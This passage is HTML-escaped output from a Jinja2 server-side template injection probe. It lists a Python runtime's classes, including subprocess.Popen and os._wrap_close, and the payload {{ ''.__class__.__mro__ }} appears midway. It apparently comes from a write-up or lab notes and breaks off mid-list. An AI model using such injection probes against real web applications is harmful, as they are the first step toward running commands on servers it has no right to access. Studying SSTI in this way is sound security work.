&amp;lt;class &amp;#39;keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ContextVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token.MISSING&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;moduledef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;module&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zip&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._DummyModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLockManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.ModuleSpec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.BuiltinImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.FrozenImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ImportLockContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._localdummy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.lock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread.RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._IOBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io._BytesIOBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_io.IncrementalNewlineDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.ScandirIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;posix.DirEntry&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.WindowsRegistryFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._LoaderBasics&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespacePath&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external._NamespaceLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.PathFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib_external.FileFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport.zipimporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zipimport._ZipImportResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.Codec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.IncrementalDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamReaderWriter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;codecs.StreamRecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_abc_data&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;abc.ABC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_itemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Hashable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Awaitable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.AsyncIterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;async_generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Iterable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_valueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list_reverseiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Sized&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Container&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.abc.Callable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins.Quitter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Printer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sitebuiltins._Helper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.itemgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.attrgetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;operator.methodcaller&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.accumulate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.combinations_with_replacement&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.cycle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.dropwhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.takewhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.islice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.starmap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.chain&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.filterfalse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.count&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.zip_longest&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.permutations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.product&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.repeat&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.groupby&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._grouper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee_dataobject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reprlib.Repr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.deque&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_reverse_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._tuplegetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections._Link&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partial&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools._lru_cache_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partialmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.singledispatchmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.cached_property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.DynamicClassAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types._GeneratorWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enum.auto&amp;#39;&amp;gt;, &amp;lt;enum &amp;#39;Enum&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Pattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Match&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sre.SRE_Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.State&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.SubPattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.Tokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib.ContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._GeneratorContextManagerBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._BaseExitStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Final&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Immutable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.Generic&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEmpty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEllipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.NamedTuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.io&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.re&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ast.AST&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;markupsafe._MarkupEscapeHelper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.poll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.epoll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;selectors.BaseSelector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_socket.socket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset._IterationGuard&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset.WeakSet&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading._RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Condition&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Semaphore&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Barrier&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Thread&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseServer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ForkingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver._NoThreads&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ThreadingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseRequestHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.date&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.timedelta&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.time&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.tzinfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize._Info&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_random.Random&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinStr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinBytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._NetlocResultMixinBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_month&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_day&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.Calendar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.different_locale&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._parseaddr.AddrlistClass&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Struct&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unpack_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.charset.Charset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header.Header&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header._ValueFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._policybase._PolicyBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.BufferedSubFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.FeedParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.BytesParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.message.Message&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.client.HTTPConnection&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLSocket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.MemoryBIO&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.Session&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ssl.SSLObject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mimetypes.MimeTypes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Decompress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Compressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Decompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMACompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMADecompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dis.Bytecode&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tokenize.Untokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BlockFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._void&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._empty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BoundArguments&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Signature&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.FrameSummary&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.TracebackException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LogRecord&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PercentStyle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.BufferingFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filterer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PlaceHolder&amp;#39;&amp;gt;, &amp;lt;class {{ ''.__class__.__mro__ }}</span><br><span class="line">&amp;#39;logging.Manager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LoggerAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug._internal._Missing&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.exceptions.Aborter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.urls.Href&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.CompletedProcess&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.Popen&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_hashlib.HASH&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2b&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2s&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_224&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_128&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._RandomNameSequence&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileCloser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.SpooledTemporaryFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.TemporaryDirectory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.OpenerDirector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.BaseHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.HTTPPasswordMgr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractBasicAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractDigestAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.URLopener&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.ftpwrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Cookie&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookiePolicy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Absent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookieJar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableListMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures._omd_bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Headers&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableHeadersMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.IfRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ContentRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.FileStorage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._MISSING_TYPE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._FIELD_BASE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.InitVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.Field&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._DataclassParams&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Finder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Loader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.ResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hmac.HMAC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.ClosingIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.FileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi._RangeWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.utils.HTMLBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.accept.AcceptMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.AuthorizationMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Encoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.decoder.JSONDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.encoder.JSONEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.FormDataParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.MultiPartParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.user_agent.UserAgent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.useragents._UserAgentParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.request.StreamOnlyMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.response.Response&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStreamMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagRequestMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagResponseMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.user_agent.UserAgentMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieHeaders&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieResponse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.EnvironBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.Client&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Decimal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.SignalDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.ContextManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;numbers.Number&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;uuid.UUID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pdata&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.PicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.UnpicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Framer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unframer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.Bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.BytecodeCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.MissingType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.LRUCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Cycler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Joiner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.EvalContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.Node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.visitor.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.idtracking.Symbols&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.MacroRef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.Frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.TemplateReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.BlockReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.LoopContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Macro&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Undefined&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ast.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Failure&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStreamIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Lexer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Environment&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateModule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateExpression&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.loaders.BaseLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.Local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local._ProxyLookup&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.SequenceMatcher&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.Differ&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.HtmlDiff&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint._safe_key&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint.PrettyPrinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleFactory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleTemplate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.BaseConverter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.Map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.MapAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;gettext.NullTranslations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._FixupStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._AtomicFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.LazyFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.KeepOpenFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.PacifyFlushWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.types.ParamType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Option&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Argument&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.ParsingState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.OptionParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.formatting.HelpFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Context&amp;#39;&amp;gt;, &amp;lt;class 